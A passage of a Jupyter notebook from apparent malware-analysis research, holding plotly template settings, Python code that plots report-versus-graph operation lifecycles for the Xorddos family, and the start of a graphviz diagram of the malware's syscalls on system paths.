              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Lifecycle Diagram of Attack Behavior in Document (Xorddos)"
        },
        "xaxis": {
         "title": {
          "text": "ASG Operation Pair (in steps)"
         }
        },
        "yaxis": {
         "title": {
          "text": "Malware Document"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# import plotly.express as px\n",
    "import plotly.graph_objects as go\n",
    "\n",
    "def symmetric_difference(list1: list, list2: list) -> list:\n",
    "    ''' return list1 - list2. '''\n",
    "    s = set(list2)\n",
    "    temp3 = [x for x in list1 if x not in s]\n",
    "    return temp3\n",
    "\n",
    "def draw_lifecycle(fset:FamilySet):\n",
    "    familname = fset.familyname\n",
    "    # reportnames = [rem.reportname for rem in fset.rem_lst if len(rem.match_regex)]\n",
    "\n",
    "    fig = go.Figure()\n",
    "    x, y = [], []\n",
    "    x_sys, y_sys = [], []\n",
    "    for i, rem in enumerate(fset.rem_lst):\n",
    "        if len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "\n",
    "        numOfDot = len(rem.OPset_order_index)\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        reportname = reportname.split('-')[1]\n",
    "        if reportname == 'Ms':\n",
    "            reportname = 'Microsoft'\n",
    "        reportname += f' ({numOfDot})'\n",
    "        x_sys.extend(rem.SysOPset_order_index) # 改變系統設定檔的 OP\n",
    "        y_sys.extend([reportname] * len(rem.SysOPset_order_index))\n",
    "        current_x_normal = symmetric_difference(rem.OPset_order_index, rem.SysOPset_order_index) # 一般的/其餘的 OP\n",
    "        # print(reportname, 'numOfDot', numOfDot, 'rem.OPset_order_index', rem.OPset_order_index)\n",
    "        # print('x_normal', current_x_normal, 'x_sys', rem.SysOPset_order_index)\n",
    "        x.extend(current_x_normal)\n",
    "        y.extend([reportname] * len(current_x_normal))\n",
    "        pass\n",
    "    # todo: add baseline's lifecycle\n",
    "    print()\n",
    "    rowname = f'ASG ({len(fset.sample.OPset)})'\n",
    "    current_x_system = fset.sample.OPset_sysOnly_ordered_index\n",
    "    current_x_normal = symmetric_difference(list(range(len(fset.sample.OPset))), current_x_system) # all steps - sysobj steps\n",
    "    # print(sorted(current_x_system)) # 只能放UPDATE的，OPEN/READ不能喔\n",
    "    x_sys.extend(current_x_system)\n",
    "    y_sys.extend([rowname] * len(current_x_system)) \n",
    "    x.extend(current_x_normal)\n",
    "    y.extend([rowname] * len(current_x_normal))\n",
    "    # print(rowname, len(fset.sample.OPset), len(current_x_system), len(current_x_normal))\n",
    "    \n",
    "    # normal OPs\n",
    "    x = [idx+1 for idx in x] # add 1 to each asg index\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x,\n",
    "        y=y,\n",
    "        marker=dict(color=\"darkorange\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Normal Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    # changeSysObj OPs\n",
    "    x_sys = x = [idx+1 for idx in x_sys]\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x_sys,\n",
    "        y=y_sys,\n",
    "        marker=dict(color=\"blue\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Change SR Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    fig.update_layout(title=f\"Lifecycle Diagram of Attack Behavior in Document ({familname})\",\n",
    "                    xaxis_title=\"ASG Operation Pair (in steps)\",\n",
    "                    yaxis_title=\"Malware Document\")\n",
    "    fig.show()\n",
    "    pass\n",
    "\n",
    "draw_lifecycle(fset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of the model checkpoint at bert-base-uncased were not used when initializing BertModel: ['cls.predictions.decoder.weight', 'cls.seq_relationship.weight', 'cls.seq_relationship.bias', 'cls.predictions.bias', 'cls.predictions.transform.dense.bias', 'cls.predictions.transform.dense.weight', 'cls.predictions.transform.LayerNorm.weight', 'cls.predictions.transform.LayerNorm.bias']\n",
      "- This IS expected if you are initializing BertModel from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).\n",
      "- This IS NOT expected if you are initializing BertModel from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['write', 'rename', 'fchmod', 'chmod', 'lchmod']\n"
     ]
    }
   ],
   "source": [
    "operationEvaluator = OperationEvaluator()\n",
    "print(operationEvaluator.update_syscall_list)\n",
    "del operationEvaluator"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw ASG & CTD's OP graph\n",
    "- 完整的 ASG OPset graph\n",
    "- 每篇報告的 CTD OPset (完整和matched兩種)，以及對應部分的 ASG。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['b', 'c', 'd']"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [1,2,3]\n",
    "b = ['a','b','c','d','e']\n",
    "[b[i] for i in a]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Title: Xorddos_asg_OPset Pages: 1 -->\n<svg width=\"5091pt\" height=\"291pt\"\n viewBox=\"0.00 0.00 5090.60 291.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 287)\">\n<title>Xorddos_asg_OPset</title>\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-287 5086.6,-287 5086.6,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2519.96\" cy=\"-265\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2519.96\" y=\"-261.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"171.96\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"171.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.79,-263.66C2022.85,-261.69 30.86,-251.21 8.96,-229 -28.86,-190.65 69.44,-181.56 129.46,-179.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"129.57,-183 139.46,-179.21 129.36,-176.01 129.57,-183\"/>\n<text text-anchor=\"middle\" x=\"25.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.rm</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.82,-263.63C2028.62,-261.56 86.34,-250.69 64.96,-229 41.52,-205.22 91.18,-191.47 130.44,-184.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"131.1,-188.04 140.4,-182.96 129.96,-181.13 131.1,-188.04\"/>\n<text text-anchor=\"middle\" x=\"88.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.clone</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.72,-263.6C2035.62,-261.38 156.68,-250.03 135.96,-229 127.08,-219.99 134.09,-208.63 144.2,-199.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"146.62,-201.55 151.93,-192.38 142.06,-196.24 146.62,-201.55\"/>\n<text text-anchor=\"middle\" x=\"161.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">54.stat64</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.66,-263.75C2046.56,-262.37 260.87,-254.74 209.96,-229 199.49,-223.71 191.1,-214.03 184.9,-204.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"187.76,-202.55 179.63,-195.76 181.75,-206.14 187.76,-202.55\"/>\n<text text-anchor=\"middle\" x=\"228.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.write</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.73,-264C2059.57,-263.85 376.8,-261.36 270.96,-229 259.29,-225.43 258.64,-219.9 247.96,-214 234.66,-206.65 219.53,-199.46 206.3,-193.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"207.62,-190.29 197.05,-189.45 204.79,-196.69 207.62,-190.29\"/>\n<text text-anchor=\"middle\" x=\"290.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.66,-263.55C2067.66,-261.27 451.49,-250.26 346.96,-229 329.57,-225.46 326.82,-219.53 309.96,-214 277.32,-203.3 239.46,-193.91 211.66,-187.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"212.43,-184.14 201.9,-185.35 210.89,-190.97 212.43,-184.14\"/>\n<text text-anchor=\"middle\" x=\"366.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.open</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"497.96\" cy=\"-178\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"497.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.64,-264.2C2065.07,-264.98 431.57,-266.22 394.96,-229 374.19,-207.89 412.48,-194.41 448.13,-186.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"448.94,-190.25 458.06,-184.86 447.57,-183.38 448.94,-190.25\"/>\n<text text-anchor=\"middle\" x=\"417.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.41,-264.15C2071.99,-264.71 499.28,-264.93 463.96,-229 455.77,-220.67 461.12,-210.14 469.79,-200.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"472.4,-203.23 477.26,-193.81 467.59,-198.15 472.4,-203.23\"/>\n<text text-anchor=\"middle\" x=\"486.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.69,-263.59C2081.58,-261.58 575.84,-251.81 532.96,-229 523.13,-223.78 515.48,-214.43 509.87,-205.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"512.81,-203.29 504.94,-196.2 506.67,-206.66 512.81,-203.29\"/>\n<text text-anchor=\"middle\" x=\"561.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">48.rename</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.41,-264.24C2109.15,-265.02 807.34,-265.7 627.96,-229 610.57,-225.44 607.48,-220.46 590.96,-214 573.92,-207.34 555.05,-200.2 538.78,-194.11\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"539.62,-190.69 529.03,-190.47 537.18,-197.25 539.62,-190.69\"/>\n<text text-anchor=\"middle\" x=\"650.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.write</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"782.96\" cy=\"-178\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"782.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.45,-263.99C2097,-263.77 713.25,-260.89 681.96,-229 659.1,-205.7 708.92,-191.54 746.4,-184.49\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"747.34,-187.88 756.58,-182.69 746.12,-180.99 747.34,-187.88\"/>\n<text text-anchor=\"middle\" x=\"704.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.55,-263.93C2105.45,-263.45 780.98,-259.62 750.96,-229 742.33,-220.2 748.74,-208.72 758.02,-198.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"760.61,-201.35 765.47,-191.94 755.8,-196.26 760.61,-201.35\"/>\n<text text-anchor=\"middle\" x=\"772.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.52,-264.35C2119.18,-265.58 890.37,-267.65 817.96,-229 807.9,-223.63 800.11,-213.94 794.46,-204.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"797.54,-202.83 789.7,-195.7 791.38,-206.16 797.54,-202.83\"/>\n<text text-anchor=\"middle\" x=\"840.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">61.write</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.6,-264.06C2140.76,-264.04 1051.32,-261.69 899.96,-229 895.46,-228.03 847.29,-207.16 814.18,-192.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"815.43,-189.42 804.87,-188.62 812.63,-195.83 815.43,-189.42\"/>\n<text text-anchor=\"middle\" x=\"922.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1038.96\" cy=\"-178\" rx=\"148.67\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1038.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">d{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.73,-263.73C2131.05,-262.44 981.23,-255.87 954.96,-229 943.08,-216.86 953.32,-206.57 970.21,-198.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"971.73,-201.69 979.56,-194.55 968.99,-195.26 971.73,-201.69\"/>\n<text text-anchor=\"middle\" x=\"985.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">67.connect</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.64,-263.61C2141.82,-261.9 1064.92,-254.06 1039.96,-229 1034.03,-223.05 1032.44,-214.47 1032.75,-206.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1036.23,-206.48 1033.92,-196.15 1029.28,-205.67 1036.23,-206.48\"/>\n<text text-anchor=\"middle\" x=\"1061.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">63.send</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.55,-264.45C2167.3,-265.71 1245.59,-267.04 1118.96,-229 1100.34,-223.41 1081.78,-212.25 1067.24,-201.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1069.29,-199.06 1059.17,-195.93 1065.14,-204.69 1069.29,-199.06\"/>\n<text text-anchor=\"middle\" x=\"1158.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">65._newselect</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1361.96\" cy=\"-178\" rx=\"66.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1361.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" 